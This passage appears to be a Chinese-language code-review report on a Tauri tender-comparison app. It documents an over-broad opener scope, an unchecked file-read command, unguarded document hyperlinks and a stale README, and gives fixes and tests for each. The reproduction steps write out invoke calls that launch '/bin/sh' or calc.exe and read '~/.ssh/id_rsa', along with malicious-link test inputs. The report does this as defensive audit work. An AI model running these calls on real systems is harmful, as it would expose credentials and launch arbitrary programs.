1) **召回损失评估（重要，修正原发现）**：features.rs:196 IDF=ln((n+1)/(d+1))+1，全命中词 IDF=**1.0 而非 0**，L2 归一化后仍带权重，并非原发现所说'几乎无损'。但被 retain 掉的是 df>stop_gram_df 的词，其 IDF 相对稀有词仍低得多；且这些词是跨大量文档共现的模板词，恰是通道3 已用同阈值判定为'停用'的同类噪声。真雷同段落除了模板高频词，一定还共享中低 df 的实词/数字/实体，那些 posting 保留、仍能把该 pair 累加过 0.25。故实际召回损失极小但**非零**——文档/注释措辞应写'高 df 模板词对召回贡献边际，停用以对称控本'，不要写'无损'。
2) 注释：candidate.rs:15 RecallParams.stop_gram_df 的 doc 现仅提 'n-gram 通道'，应改为通道3/4 共用（'过长倒排的 gram/token 视为模板高频，两个倒排通道均停用'）。
3) 建议加一行不变量注释说明两通道对称，防回归。

无需改数据库/schema/前端/导出。

**钉死测试**

测试名：tfidf_channel_caps_high_df_posting（放 src-tauri/src/engine/candidate.rs 的 #[cfg(test)] mod tests，紧邻现有 hash_and_ngram_channels_recall_similar_pairs）。
构造：一批共享同一模板高频词但彼此无真雷同的跨文档 chunk（如 N=40 个 chunk 分布在 3 个 doc，每个都含 '项目/投标/技术' 且各自加独有实词），令 df(模板词)=N > stop_gram_df（测试里把 RecallParams.stop_gram_df 设很小，如 5，或直接构造 N 略大于阈值）。
断言（旧代码失败/新代码通过的可观测代理——因纯性能不好直接断言耗时，用'语义等价的召回行为'钉住）：
(A) 主断言：设 stop_gram_df=3，两 chunk 仅共享一个 df 超阈的模板词、无其它共享词时，got 不含该跨文档 pair —— 旧代码（无 retain）会因该高频词点积累加而可能 >=0.25 命中，新代码停用后不命中。需精心配权使旧代码确实命中（让共享模板词的 tf 足够大令归一化后点积≥0.25）。
(B) 保护断言：真雷同 pair（额外共享多个中低 df 实词）在新旧代码下都仍被召回，证明 cap 不误伤。
补充（可选，作为性能回归护栏）：一个 #[ignore] 的大 N 基准，或断言 inverted 中不存在 v.len()>stop_gram_df 的条目（把 retain 后的 inverted 长度暴露成可测——或用白盒方式在测试内重建验证）。核心用 (A)(B) 钉死。

**对原发现的修正**

1) 机制基本准确，但原发现称'高频词 IDF 权重本就低对召回几乎无损'不精确：features.rs:196 的 IDF 有 +1 下限，全命中词 IDF=1.0 非0，L2 归一后仍带权重，召回损失是'极小但非零'而非'无损'——修复注释/文档措辞需相应收敛。2) 行号微调：通道4 主体在当前代码 candidate.rs:110-144（原发现写 110-137，其中 138-144 是 push 回填，倒排构建在 112-117、累加在 118-131、0.25 过滤在 133），落点正确。3) 严重级 STRUCT 恰当：这是可扩展性/性能退化不是正确性/误告缺陷（召回结果不变），不宜升为 CRIT；也确非'设计如此'——通道3 line74 的存在证明作者本意是要停用保护，通道4 缺失属遗漏而非有意。4) 补充定位价值：调用方 compare_service.rs:172 已经算好了 (len/10).max(256) 并传入 stop_gram_df，只是没在通道4 复用，故修复是纯一行 retain、零参数改动、零迁移。

---

### S11 · opener open-path/reveal scope 仍是通配 `**`，CHANGELOG「opener 收口」失实（纵深防御缺口）

**级别** 🟠 STRUCT · **工作量** S

**位置**
- `src-tauri/capabilities/default.json:12-19 (open-path allow=**@14, reveal-item allow=**@18)`
- `src/screens/DocPreview.tsx:205 (openPath(doc.filePath))`
- `src/screens/Export.tsx:90 (openPath(lastExport.path))`
- `src/screens/Export.tsx:99 (revealItemInDir(lastExport.path))`
- `src-tauri/tauri.conf.json:26 (CSP script-src 'self')`
- `src/components/MdView.tsx:23-31 (DOMPurify 白名单)`
- `CHANGELOG.md:20 (「opener 收口」文案)`
- `src-tauri/src/commands/export.rs:34 (注释称『配合 opener scope 收敛』——实际未收敛)`

**机制（逐环调用链）**

逐环当前属实：1) src-tauri/capabilities/default.json:13-15 授予 `opener:allow-open-path` 且 allow=`[{path:"**"}]`；:17-19 授予 `opener:allow-reveal-item-in-dir` allow=`[{path:"**"}]`——无任何目录约束。2) 前端存在三条到达点：DocPreview.tsx:205 `await openPath(doc.filePath)`、Export.tsx:90 `await openPath(lastExport.path)`、Export.tsx:99 `await revealItemInDir(lastExport.path)`；path 参数直达插件，Rust 侧无二次校验（grep src-tauri/src 无 open/reveal 的 canon/validate；export.rs 的扩展名闸门只管写入侧，管不到 open）。3) tauri_plugin_opener 的 open-path 走 OS 默认处理器（macOS `open`/Linux `xdg-open`/Windows ShellExecute），对可执行/脚本/文档路径即等于『用系统默认程序打开→可执行』。scope=`**` 意味着若 webview 上下文被攻陷并调用 `invoke('plugin:opener|open_path',{path:任意})`，可打开磁盘任意路径。4) 收口史与失实：6f49438 曾把两者收窄到 `$HOME/**`（git show 6f49438:default.json 确认 path=$HOME/**），7fe84a8 以『支持导出到 U 盘/外部卷后打开』为由回退到 `**`（收窄理由仅存 commit message），且 `git merge-base --is-ancestor 7fe84a8 da91bb8` 为真——即回退早于发布提交 da91bb8。5) 但 CHANGELOG.md:20 v0.5.0 仍写『… + opener 收口，掐断「XSS → 任意写盘 / 执行」放大链』，export.rs:34 注释亦称『配合 opener scope 收敛』；两处与代码现状(`**`)矛盾。6) 之所以是纵深防御缺口而非活漏洞：tauri.conf.json:26 CSP `script-src 'self'`（阻内联/远程脚本），且唯一渲染外部标书 md 的 MdView.tsx:23-31 用 DOMPurify 白名单(ALLOWED_TAGS 无 script、ALLOWED_ATTR 仅 href/title、ALLOW_DATA_ATTR:false)剥脚本/事件——当前无已知路径把外部标书内容变成可执行 JS，故 `**` 是『若前端被攻陷则放大到任意执行』的兜底缺失，而非可直接触发。

**最小复现**

纯前端复现开关缺口（不依赖真实 XSS）：在 v0.5.0 devtools console 执行 `await window.__TAURI__.core.invoke('plugin:opener|open_path',{path:'/bin/sh'})`（macOS/Linux）或指向任意 `C:\Windows\System32\calc.exe`（Windows），因 scope=`**` 该调用被放行、OS 处理器启动目标；把 path 换成 `$HOME/Library/LaunchAgents/x.plist` 之外的任意系统路径同样放行。对比若 scope 收敛到报告/导入目录集合，则同一调用应被 opener 拒绝(scope not allowed)。业务侧正常路径不受影响：3 份 25 页扫描件比对完，用户在 DocPreview 点『打开原文件』(openPath(doc.filePath)) 或在 Export 点『打开/在文件夹显示』导出报告，均落在导入目录与导出目录内，收敛后仍应放行。

**影响面**

影响面=全体用户、默认配置命中（default capability，无需任何开关，所有窗口/所有平台）。严重度=纵深防御缺失：单一前端漏洞(第三方依赖 XSS、marked/DOMPurify 绕过、未来新增的未消毒 innerHTML 面)即可从『读』升级到『用 OS 默认程序打开任意磁盘路径→执行』，与产品『离线取证/宁转人工不误告』的高信任定位相悖。触发频率=正常业务永不触发(open/reveal 目标恒在导入/导出目录)，故收敛几乎零回归面；缺口只在被攻陷时被利用。与 STRUCT 相称：非活漏洞不判 CRIT，但属发布口径失实(CHANGELOG/注释声称已收口而实际未收)＋兜底层缺失的结构问题。

**修复设计**（尚未落地）

两步（代码收敛 + 文案对齐）。A) 运行时动态授权（推荐，能真正支持外部卷且保持最小权限）：改 default.json 移除两条静态 `{path:"**"}`，改用 opener 的运行期 scope 授权——在 Rust 侧于导出完成(export.rs 返回 path 处)与文档导入登记 filePath 时，调用 `app.opener_scope()` 风格 API（或 tauri fs-scope allow_file）把该具体文件/其父目录动态加入 allowlist，再暴露一个后端 command 由前端 openExported/openOriginal 调用，前端不再直接 import plugin-opener。副作用：需前端三处(DocPreview.tsx:205、Export.tsx:90/99)改走后端 command；U 盘/网络盘因是运行时按实际 path 授权，天然支持。B) 若坚持静态 scope 的最小改法：default.json 两条 allow 收敛为目录集合，如 `[{"path":"$HOME/**"},{"path":"$DOCUMENT/**"},{"path":"$DOWNLOAD/**"},{"path":"$DESKTOP/**"}]`——注意这不覆盖任意外部卷(U 盘挂载点 /Volumes/*、/media/*、其他盘符)，会重现 7fe84a8 要解决的问题，且 `$HOME/**` 对『XSS→执行』防护有限(投放的 payload 通常就落在 $HOME 下)，故 A 优于 B。无论 A/B 都需一并改：1) CHANGELOG.md:20——若采 A/B 真收敛则保留『opener 收口』但措辞改为『按会话动态授权/目录集合收敛』；若最终仍决定放宽，则删『opener 收口，掐断…执行』一句，改述为已知权衡；2) export.rs:34 注释同步为真实策略；3) 新增 docs/SECURITY.md（当前不存在）记录 opener 威胁模型与权衡；4) 无 DB 迁移号涉及(纯前端/capability/文案)。

**钉死测试**

因 capability 为声明式 JSON，最省的钉子是纯前端断言(vitest，与现有 src/utils/*.test.ts 同栈)。新增 src-tauri/capabilities/default.opener-scope.test.ts 或 src/security/capabilities.test.ts，名 `opener scope must not be world-wildcard`：读取 src-tauri/capabilities/default.json，找到 identifier==='opener:allow-open-path' 与 'opener:allow-reveal-item-in-dir' 两项，断言 `expect(perm.allow.every(a=>a.path!=='**')).toBe(true)`（旧代码两项 path 均为 `**`→失败；收敛/动态授权后→通过）。配套断言 CHANGELOG 与实现一致可选：`expect(changelog).toContain('opener')` 保留但改由人工核。若采方案 A 全删静态 allow，则断言改为『不存在 path===`**` 的 opener 条目』。

**对原发现的修正**

基本属实，两点澄清：(1) 行号微调——finding 写『12-19』，当前 open-path 的 `**` 精确在 default.json:14、reveal 在 :18（整块 12-19 无误，允许同文件内定位到 14/18）。(2) 机制补强：真正有『执行』风险的是 `opener:allow-open-path`(走 OS 默认程序打开＝可执行)，`reveal-item-in-dir` 的 `**` 仅在文件管理器中定位/高亮任意路径，本身不执行、危害次一等，收敛时两者都应改但优先级 open-path 更高。(3) 对『收口』历史的评价补充：6f49438 的 `$HOME/**` 其实对『XSS→执行』防护有限(恶意 payload 常落在 $HOME 内)，故 CHANGELOG 的『掐断执行放大链』即便在 6f49438 当时也偏夸大——这使『文案失实』结论更成立，而非削弱。严重级 STRUCT 判定准确（非活漏洞、CSP+DOMPurify 兜底成立，不宜 CRIT；但默认命中＋发布口径失实＋兜底缺失，高于普通 INCR）。不是纯『设计如此』——commit 6f49438 已表明团队意图收敛，7fe84a8 的回退是可用性权衡而非安全设计决策，且未在用户可见的 SECURITY 文档记录，故按结构缺陷处理正确。

---

### S12 · read_text_file 是无约束任意路径读原语，与 export_report 自设「webview 被攻陷」威胁模型内部不一致

**级别** 🟠 STRUCT · **工作量** S

**位置**
- `src-tauri/src/commands/settings.rs:145-154`
- `src-tauri/src/lib.rs:118`
- `src-tauri/src/api/index.ts:144`
- `src/screens/BatchImportModal.tsx:89`
- `src-tauri/src/commands/export.rs:33-46`
- `src-tauri/capabilities/default.json:6-20`
- `src-tauri/src/engine/parse.rs:303-314`

**机制（逐环调用链）**

逐环调用链（全部对当前 main@4078315 代码核对属实）：
1) 触发点：webview JS 调 `call<string>("read_text_file", { path })`（src-tauri/src/api/index.ts:144 `readTextFile`）。这是普通 IPC，任何在 webview 上下文执行的脚本都能调，不限于 BatchImportModal。
2) 注册：lib.rs:118 `commands::settings::read_text_file` 挂进 invoke_handler，无任何 command-level 校验中间件。
3) 命令体：settings.rs:146 `pub async fn read_text_file(path: String) -> AppResult<String>`。参数是裸 `String`，Rust 侧对 path 无任何检查——不校验扩展名、不校验大小、不校验是否在某 scope/工作区目录内、不做符号链接/`..` 归一化。
4) settings.rs:147 `std::fs::read(&path)` 在 spawn_blocking 里对该绝对路径做全量字节读取（无 size 上限、无流式）。进程即宿主用户权限，可读该用户一切可读文件（`~/.ssh/id_rsa`、`~/.config`、其他标段的标书、任意机密）。
5) settings.rs:150 `decode_text(&bytes)`（parse.rs:303-314）：UTF-8 优先、GB18030 兜底，把整段字节 lossy 解码成 String。
6) 错误结果：settings.rs:146 的返回值 `AppResult<String>` 把**文件全文**原样回给 webview。这是全仓唯一「直接把任意磁盘文件正文回传前端」的读原语——比 import 通道更危险，因为它不经落库/解析裁剪，是逐字节全文。
对照证据：export.rs:33-46 明确按「即便 webview 被攻陷绕过保存对话框传入任意 path」建模，对**写**侧做了 ALLOWED_EXT 白名单（html/docx/xlsx/json/md/csv）+ 扩展名校验并拒绝。读侧 read_text_file 完全没有对等防线——同一威胁模型下写侧设防、读侧敞开，即为内部不一致（STRUCT）。
放大链评估：capabilities/default.json 未启用 tauri-plugin-fs（Cargo.toml 无该依赖），故此 command 是唯一自建读通道，fs 插件 scope 机制根本不介入；CSP `script-src 'self'`（tauri.conf.json:26）降低但不消除 webview 注入面（依赖链/富文本/未来内容注入仍是现实入口），且威胁模型一旦按「webview 被攻陷」建立，读侧缺口就是确定性可利用面。

**最小复现**

评标真实场景：评标室一台机器同时处理 A 标段（3 份 25 页扫描件）和保密的 B 标段材料。操作员在「批量导入查重源模板」里点选文件走正常路径。此时若 webview 侧存在任意脚本执行（被污染的第三方前端依赖、粘贴进富文本的恶意内容、或未来某处 innerHTML 注入），攻击脚本无需任何对话框即可直接：`window.__TAURI__.core.invoke('read_text_file', { path: '/Users/<operator>/Documents/B标段/评标底价.xlsx.txt' })` 或 `invoke('read_text_file', { path: '/Users/<operator>/.ssh/id_rsa' })`，命令同步返回目标文件**全文字符串**，再经任何已放行出站通道外泄。最小纯后端复现：直接以 `path="/etc/hosts"`（或任意用户机密文件）调用 read_text_file，当前代码成功返回其全文，无扩展名/大小/scope 拦截——证明「仅按对话框选定路径读」只是前端约定，非后端约束。

**影响面**

受影响：所有安装用户，默认配置即命中（capabilities 默认、无 fs 插件 scope 兜底，command 无条件注册且无校验）。严重度：违反项目核心「全程离线取证、保护标书正文机密」价值观——这是唯一能把任意磁盘文件**全文**回传 webview 的原语，一旦 webview 被攻陷即为跨标段/系统机密的确定性读取外泄面，远重于间接 import 通道（后者落库+解析，非逐字节全文直返）。发生频率：正常使用零触发（前端只传对话框选定路径），是「攻陷放大」类结构缺口而非崩溃类高频 bug；但与 export.rs 已设防写侧并列看，属应堵而未堵的对称缺口。默认 CSP `script-src 'self'` 收窄注入面，故实际利用门槛中等，级别定 STRUCT（结构性不一致）恰当，不宜升 CRIT（无已知直达 RCE/无默认外泄出站）。

**修复设计**（尚未落地）

对齐 export.rs 的纵深防御，在 read_text_file 加与写侧对称的读侧白名单 + 大小上限，不引新依赖：
```rust
// settings.rs
const READ_ALLOWED_EXT: &[&str] = &["txt", "csv", "json", "md"]; // 与 BatchImportModal 对话框 filters 对齐
const READ_MAX_BYTES: u64 = 32 * 1024 * 1024; // 模板文件足够；防超大文件全量读

#[tauri::command]
pub async fn read_text_file(path: String) -> AppResult<String> {
    let p = std::path::Path::new(&path);
    let ext_ok = p.extension().and_then(|e| e.to_str())
        .map(|e| READ_ALLOWED_EXT.contains(&e.to_ascii_lowercase().as_str()))
        .unwrap_or(false);
    if !ext_ok {
        return Err(AppError::new(AppErrorCode::InvalidConfig,
            "仅允许读取 txt/csv/json/md 文本文件"));
    }
    tauri::async_runtime::spawn_blocking(move || {
        let meta = std::fs::metadata(&path)?;
        if meta.len() > READ_MAX_BYTES {
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, "文件过大"));
        }
        std::fs::read(&path)
    })
    .await
    .map_err(|e| AppError::new(AppErrorCode::Unknown, "读取文件失败").with_detail(e.to_string()))?
    .map(|bytes| crate::engine::parse::decode_text(&bytes))
    .map_err(|e| AppError::new(AppErrorCode::FileNotFound, "文件不存在或不可读").with_detail(e.to_string()))
}
```
为可单测，建议把校验抽成纯函数 `fn validate_read_path(path: &str) -> AppResult<()>`（扩展名判定），command 内先调它——便于 pinning test 不碰文件系统即可断言。
更强方案（可选，effort 升 M→L）：改用 tauri dialog 返回的 scope 令牌/FilePath 绑定用户实选路径，从根上杜绝任意 path，但需前端 BatchImportModal.tsx:81-98 改为传 FilePath 句柄而非 string，改动面更大。当前项目已用「扩展名白名单」范式（export.rs），推荐先做对称白名单方案，成本最低且立即消除内部不一致。
副作用与需一并改处：
- 注释：settings.rs:143-144 现注释「仅按用户经对话框选定的路径读取」是错误的安全暗示，须改为「Rust 侧强制扩展名白名单 + 大小上限，前端对话框 filters 仅为 UX」。
- 前端一致性：BatchImportModal.tsx:86 对话框 filters 含 `md`，白名单须含 `md`（已含）；若产品未来允许其它扩展名需两处同步。
- 无 DB 迁移号涉及（纯 command 逻辑）。
- decode_text 无需改动。

**钉死测试**

在 src-tauri/src/commands/settings.rs 末尾新增 `#[cfg(test)] mod tests`（该文件当前无 test 模块，仓库惯例为内联 mod tests，见 config.rs/parse.rs）。测试名 `read_text_file_rejects_non_whitelisted_extension`：断言对 `validate_read_path("/etc/hosts")`、`validate_read_path("/Users/x/.ssh/id_rsa")`、`validate_read_path("/tmp/secret.pem")` 返回 `Err`（AppErrorCode::InvalidConfig），对 `/tmp/a.txt`、`/tmp/b.csv`、`/tmp/c.json`、`/tmp/d.md` 返回 `Ok(())`。旧代码无 validate 函数/无校验 → 该断言在旧码为红（无扩展名门直接放行）；修复后为绿。补充 `read_text_file_rejects_oversized_file`：写一个 >READ_MAX_BYTES 的 `.txt` 临时文件（tempfile crate 或 std::env::temp_dir），断言 command 返回 Err；旧码会成功全量读取 → 红。关键断言聚焦「拒绝非白名单扩展名」与「拒绝超限大小」，恰好覆盖旧码两条缺口。

**对原发现的修正**

机制、行号、注册点(lib.rs:118)、生产调用点(BatchImportModal.tsx:89)、与 export.rs 威胁模型对照——全部核对属实，仅原发现给的 145-154 应精确到 command 体 146-154（143-144 为注释，145 为 #[tauri::command]），属同文件内微调，不影响结论。补充两点更精确的定性：(1) 项目未依赖 tauri-plugin-fs（Cargo.toml 无、capabilities 无 fs 权限），故此 command 是唯一自建读通道，fs 插件 scope 机制根本不参与——原发现「改用 tauri dialog scope 令牌」方向可行但成本高于对称白名单，推荐后者。(2) CSP 为 `script-src 'self'`（tauri.conf.json:26），对 webview 注入有实质收窄，故利用门槛中等，STRUCT 级别恰当、不应升 CRIT。原发现结论成立，非「其实是设计」——export.rs 已为对称的写侧显式设防，证明读侧敞开确属应堵未堵的内部不一致，而非有意为之。

---

### S13 · docx-preview / MdView 超链接未做导航防护，点击致 WebView 就地导航到外部 URL

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** S

**位置**
- `src/components/DocxView.tsx:21-25 (renderAsync 挂载，无 click 捕获)`
- `src/components/DocxView.tsx:41 (hostRef 容器，宜挂 onClickCapture)`
- `src/components/MdView.tsx:23-31 (DOMPurify 放行 a[href]/http(s))`
- `src/components/MdView.tsx:73 (bg-md-host 容器，宜挂 onClickCapture)`
- `node_modules/docx-preview/dist/docx-preview.js:3477-3489 (renderHyperlink: result.href = rel.target 无 scheme 过滤)`
- `src-tauri/src/lib.rs:40-80 (Builder 无 on_navigation/on_page_load 守卫)`
- `src-tauri/tauri.conf.json:26 (CSP 仅生产注入)`
- `src-tauri/capabilities/default.json:6-20 (opener 仅 open-path/reveal-item，无 open-url)`

**机制（逐环调用链）**

逐环调用链（均已 Read 当前代码确认属实）：
1) 用户在 DocPreview 切到「原文版式」→ src/screens/DocPreview.tsx:382 渲染 <DocxView data=... />（docx），或 :383 <MdView>（md）。
2) DocxView.tsx:21 renderAsync(data.slice(0), host, undefined, {...}) 把外部投标方的 .docx 渲染进 hostRef 容器（:41）。docx-preview dist:3477-3489 renderHyperlink 里，对 targetMode==='External' 的关系，直接 `result.href = rel.target`（:3488），target 原样来自 word/_rels/document.xml.rels 的 Target 属性，无任何 scheme 白名单/过滤——攻击者可写 http(s)://evil、也可写 file://、甚至 javascript:。
3) 全局无防线：grep 全 src 无任何 a[href] 的 click 捕获（DocPreview.tsx 里所有 preventDefault 都是 role=button 的键盘/自定义按钮处理，非 anchor 拦截）；lib.rs:40-80 的 tauri::Builder 链上没有 on_navigation / on_page_load / on_web_resource 守卫。
4) 用户在版式预览点该链接 → WKWebView 默认行为：就地导航当前 webview 到该 URL。离线环境下外部 http(s) 加载失败→整窗白屏，应用不可用需重启；联网时则命中钓鱼页/受控页（DOM 里仍持有 Tauri IPC 上下文，构成攻击放大面）。
5) MdView 路径同理：marked 把 [x](http://evil) 渲染成 <a href>，DOMPurify.sanitize（MdView.tsx:23-31）ALLOWED_TAGS 含 'a'、ALLOWED_ATTR 含 'href'，DOMPurify 默认放行 http(s) href（且默认剥 javascript: 但保留 http/https/file），同样无 click 拦截 → 同样就地导航。
6) javascript: 这一子集：生产 CSP（tauri.conf.json:26 script-src 'self'）会拦 javascript: 求值；但 CSP 仅对生产 frontendDist（tauri:// 协议）注入，dev 模式走 devUrl=http://localhost:1420（Vite，无 CSP 头，配置里也无 devCsp），故 dev 侧 javascript: 与就地导航双双无防护——这正是需要前端 click 捕获兜底的原因。

**最小复现**

评标真实场景：办案人员一次导入 3 家投标人的 .docx 技术标做交叉比对。其中 B 家标书正文里有一处「详见 http://（受控域名）/附件」超链接（合法标书里页脚/参考链接很常见，非刻意投毒也会中）。比对出雷同簇后，办案人员在簇详情点「查看原文」→ DocPreview 切「原文版式」→ 鼠标点到那处蓝色链接。此时：(a) 现场取证机按规程离线 → WKWebView 就地导航 http 失败→整窗白屏，正在进行的批注/比对上下文丢失，需重启应用重新进入；(b) 若该机联网 → 直接把内网取证会话导航到投标方可控页面。md 标书同样触发。javascript: 变体在 dev 构建下还可直接执行脚本。

**影响面**

受影响：所有查看 docx/md 原文版式且标书含超链接的用户（核心取证工作流，非边缘路径）。默认配置命中——无需任何开关，版式视图默认可用，链接默认可点，无守卫。严重度：单击即触发、破坏「全程离线不可用即白屏」体验并制造钓鱼/IPC 攻击面，符合 STRUCT（结构性防线缺失，威胁模型 MdView 注释已自认「标书来自外部投标方」）。发生频率：正规标书页脚/参考文献带链接极常见，实战中中招概率高，非需精心投毒的低频 corner case。pdf/txt/xlsx 不受影响（PdfView 文本层、TxtView 纯文本不产 <a href>）。

**修复设计**（尚未落地）

分层修复，前端 click 捕获为主防线（覆盖 dev/prod 两态），可选 Rust on_navigation 为纵深兜底。

1) 新增纯函数分类器（便于单测，无 DOM 依赖），建议放 src/utils/linkGuard.ts：
```ts
export type LinkAction = { kind: 'external'; url: string } | { kind: 'ignore' };
export function resolveLinkAction(rawHref: string | null): LinkAction {
  const href = (rawHref ?? '').trim();
  if (!href || href.startsWith('#')) return { kind: 'ignore' }; // 站内锚点交给默认或忽略
  let scheme = '';
  const m = /^([a-z][a-z0-9+.-]*):/i.exec(href);
  if (m) scheme = m[1].toLowerCase();
  if (scheme === 'http' || scheme === 'https') return { kind: 'external', url: href };
  return { kind: 'ignore' }; // javascript:/file:/data:/vbscript: 等一律丢弃
}
```
2) 提供一个共享的 React 事件处理（src/utils/linkGuard.ts 里 export）：
```ts
import { openUrl } from '@tauri-apps/plugin-opener';
export function onCaptureAnchorClick(e: React.MouseEvent) {
  const a = (e.target as HTMLElement)?.closest?.('a[href]') as HTMLAnchorElement | null;
  if (!a) return;
  e.preventDefault();
  const action = resolveLinkAction(a.getAttribute('href'));
  if (action.kind === 'external') void openUrl(action.url).catch(() => {});
}
```
3) DocxView.tsx:40 外层 div 与 MdView.tsx:61 外层 div（或直接 hostRef 容器 DocxView:41 / MdView:73）加 `onClickCapture={onCaptureAnchorClick}`。用捕获相位确保先于任何默认导航执行。

副作用与需一并改处：
- 需在 src-tauri/capabilities/default.json 增加 opener open-url 权限（当前只有 allow-open-path / allow-reveal-item-in-dir），否则 plugin-opener.openUrl 会被 capability 拒绝：新增 { "identifier": "opener:allow-open-url", "allow": [{ "url": "http://*" }, { "url": "https://*" }] }（scheme 收敛，勿放 file/**）。这是与「离线优先」价值观的取舍点：openUrl 会用系统浏览器打开外链，需产品确认是否允许——若产品要求纯离线「一律不打开、仅丢弃」，则 onCaptureAnchorClick 里对 external 也走 ignore（只 preventDefault 不 openUrl），fixDesign 更简单且零新增 capability。
- MdView.tsx:2-3 已有威胁模型注释，建议补一句说明 href 导航由 click 捕获兜底（DOMPurify 只剥脚本不拦导航）。
- 纵深可选：lib.rs run() 里 Builder 加 .on_navigation(|url| url.scheme()=='tauri' || url.as_str().starts_with('http://localhost:1420')) 拦截一切非应用自身的就地导航（生产 tauri:// / dev localhost:1420 放行，其余 false）；这条独立于前端修复，能挡住任何漏网的就地导航（含未来其它组件）。

**钉死测试**

分两层：
(A) 纯函数层（无需 DOM，匹配现有 src/utils/*.test.ts 风格，推荐）——新增 src/utils/linkGuard.test.ts：
- test 'resolveLinkAction: http(s) 判为 external 并带原 url' → expect(resolveLinkAction('http://evil.test/x')).toEqual({kind:'external',url:'http://evil.test/x'})；https 同理。
- test 'javascript:/file:/data: 一律 ignore' → 三个断言均 expect(...).toEqual({kind:'ignore'})（旧代码根本没有此函数→测试文件 import 失败/函数不存在，红；修复后绿）。
- test '站内锚点 #foo 与空 href → ignore'。
(B) 集成层（可选，需 DOM）——需在测试文件顶部加 `// @vitest-environment jsdom` 并把 jsdom 加入 devDependencies（当前项目无 jsdom，现有测试全是纯函数）：新增 src/components/DocxView.linkguard.test.tsx，渲染含 <a href='http://evil'> 的容器、mock @tauri-apps/plugin-opener 的 openUrl、派发 click，断言 e.preventDefault 被调用且 openUrl 收到 'http://evil'、且 window.location 未变。因需引 jsdom 新依赖，实操优先 (A)，(A) 已能钉住『scheme 分类』这条核心防线的回归。

**对原发现的修正**

机制、严重级(STRUCT)、威胁模型描述均属实，核心结论成立，仅两处需修正：1) docx-preview dist 行号原写『3473-3486』有偏移，当前 v0.3.7 dist 中 renderHyperlink 实为 3477-3489（result.href=href 在 3488，External 关系匹配在 3482），同一函数、结论不变。2) 原修复方向写『http(s) 交 plugin-opener 外部打开』，但当前 capabilities/default.json 只授予了 opener open-path/reveal-item，未授予 open-url——直接调 openUrl 会被 capability 拦；修复必须一并新增 opener:allow-open-url 权限（且此举与『全程离线』价值观有取舍，需产品确认是否允许用系统浏览器打开外链，或改为『一律丢弃不打开』的纯离线方案）。此外原发现位置 DocxView.tsx:21-25 指向 renderAsync 调用是合理锚点，但真正要挂 click 捕获的是 :40/:41 的容器 div；MdView 侧的同源问题原发现已提及，位置在 :23-31(DOMPurify)/:61-73(容器)。

---

### S14 · README 仍是 8 行 Tauri 脚手架样板，未介绍产品(GitHub Release 用户首屏看不到产品定位/离线承诺/平台限制)

**级别** 🟠 STRUCT · **工作量** S

**位置**
- `README.md:1-8 (整文件，8 行含末尾换行)`
- `对照物 .github/workflows/release.yml:56-63 (对外发布安装包到 GitHub Release)`
- `对照物 BUILD.md:1-3 (面向构建者，非产品首页)`
- `对照物 CHANGELOG.md:32-35 (下载矩阵与平台限制只在此)`

**机制（逐环调用链）**

逐环调用链，每环已 Read 当前代码确认属实：
1) README.md:1-8 — 全文仅 8 行(od -c 确认末尾一个 \n)，内容为『# Tauri + React + Typescript / This template should help get you started… / ## Recommended IDE Setup / - VS Code + Tauri + rust-analyzer』，即 Vite 官方 create-tauri-app 脚手架原样样板。git log --follow -- README.md 只有一条提交 bc1deb9(chore: scaffold Tauri 2 + React 19 + Rust)，脚手架后从未更新。
2) 触发点=对外发布：.github/workflows/release.yml:4-7 on push tag v* 或 workflow_dispatch → :46-63 tauri-action 三平台构建，:60 releaseDraft:true 发布到 GitHub Release，:59 releaseBody 才有一句产品定位。用户从 Release 页点仓库名进入仓库主页 → GitHub 默认渲染根目录 README.md 作为首屏(find 确认根 README.md 是唯一会被渲染成首页的；app-design/README.md 在子目录且内容是『CODING AGENTS: READ THIS FIRST』设计交接包，不是产品介绍)。
3) 错误结果：首屏看不到 (a) 产品定位『原本·标书查重/离线交叉比对/围标识别』；(b) 核心价值观『全程离线、日志不记正文、宁转人工不误告』；(c) 平台限制 macOS 仅 arm64(此关键限制仅散落在 BUILD.md:35-36 和 CHANGELOG.md:33，README 一字未提)；(d) 下载矩阵(仅在 CHANGELOG.md:32-35)。BUILD.md:1『构建与发布』面向构建者，不替代产品首页且 README 也没有指向它的链接。

**最小复现**

最小复现(无需运行代码)：1) 打 tag 触发 release.yml → GitHub Release 生成安装包草稿(真实分发路径，已在用 v0.5.0)。2) 一名评标/招标从业者(非开发者)从 Release 页点进仓库主页，想确认『这工具能不能一次导入 3 份 25 页扫描件标书交叉查雷同、是否全程离线不外传标书、我的 Intel Mac 能不能装』。3) 首屏只看到『Tauri + React + Typescript 模板 / 推荐用 VS Code + rust-analyzer』——零产品信息、零离线承诺、零平台限制。用户既无法判断是否该下载，Intel Mac 用户更会盲目下载 aarch64 dmg 后打不开。

**影响面**

受影响：所有通过 GitHub Release/仓库主页评估或首次接触产品的外部用户(潜在客户、评标机构、被举证方)与新贡献者。严重度=结构性但非运行时安全问题：不误告标书、不泄正文，属对外沟通/可信度缺陷——一个主打『可举证取证』的合规工具，首页却是脚手架样板，直接损害专业可信度；Intel Mac 用户因 README 无平台限制会下错包。默认配置命中：release.yml 是唯一发布路径(已发 v0.5.0)，GitHub 恒渲染根 README 为首页，故 100% 命中每一个访问仓库主页的人。频率：每次发版/每次有人点进主页都发生。不影响核心检测/离线逻辑，故为 STRUCT 而非 CRIT。

**修复设计**（尚未落地）

仅重写 README.md 一个文件(不动代码，无迁移号)。结构建议：
1) 标题+一句话定位：『# 原本 · 标书查重 (BidGuard) — 离线标书交叉比对与围标识别取证工具』。
2) 核心价值观区块：全程离线(不上传任何文件)、日志永不记录标书正文、宁转人工不误告——与 BUILD.md:3『全程本地处理，不上传任何文件』口径一致。
3) 能力简介：一次导入 2~10 份不同投标人标书，交叉找雷同/矛盾(金额·日期冲突)/围标特征，输出可举证报告。
4) 截图/GIF(可留占位 `<!-- TODO screenshot -->`，或引用 app-design 现成设计图)。
5) 下载矩阵与平台限制表(从 CHANGELOG.md:32-35 提炼)：macOS 仅 Apple 芯片/arm64(Intel 暂不支持，见 BUILD.md)、Windows x64(.exe/.msi)、Linux(.AppImage/.deb/.rpm)——避免 Intel 用户下错包。
6) 链接区：构建/开发 → BUILD.md；更新记录 → CHANGELOG.md；下载 → GitHub Releases。
副作用与需一并改处：
